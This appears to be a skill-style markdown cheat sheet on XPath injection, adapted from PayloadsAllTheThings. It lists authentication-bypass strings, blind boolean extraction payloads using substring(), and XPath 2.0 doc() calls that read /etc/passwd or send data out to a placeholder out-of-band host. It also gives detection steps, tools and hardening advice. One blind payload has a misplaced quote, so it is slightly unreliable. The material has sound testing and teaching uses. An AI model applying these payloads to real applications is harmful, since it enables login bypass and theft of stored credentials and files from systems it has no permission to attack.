---
name: xpath-injection
description: Inject XPath syntax in XML-backed auth and search to bypass logic and extract document contents via boolean/timing blind techniques
domain: cybersecurity
subdomain: web-application-security
tags: [xpath, xpath-injection, xml]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/XPATH Injection
---

# XPath Injection

## Overview
Apps that query XML documents with XPath built via string concat are vulnerable. Auth-bypass payloads mirror SQLi; blind extraction works char-by-char via `substring()`.

## Auth Bypass
Query: `//user[username/text()='X' and password/text()='Y']`
```
X = ' or '1'='1
Y = ' or '1'='1
→ //user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
```

## Other Payloads
```
') or true() or ('
' or count(parent::*[position()=1])=1 or 'a'='a
' or contains(name(parent::*[position()=1]),'user') or 'a'='a
' or substring((//user[1])[1],1,1)='a' or 'a'='a
```

## Blind Boolean
```
' or substring(//user[1]/password,1,1)='a or 'a'='a
```
Iterate position and character.

## XPath 2.0 (more powerful)
- `doc('file:///etc/passwd')` for local file read.
- `doc('http://OOB/?d=...')` OOB exfil — depends on parser.

## Detection
- Insert single quote, observe error or response diff.
- Send `' or '1'='1` vs `' or '1'='2`.

## Tools
- **XPath-Blind-Explorer**, **xcat** (Tom Forbes).
- Burp manual.

## Hardening
- Parameterized XPath APIs (`XPathExpression` with variables in Java/.NET, lxml `XPathEvaluator` with vars in Python).
- Escape single quotes via `concat()` or context separation.
- Where possible, replace XML auth backend with proper database.

## References
- `payloadsallthethings/XPATH Injection/README.md`
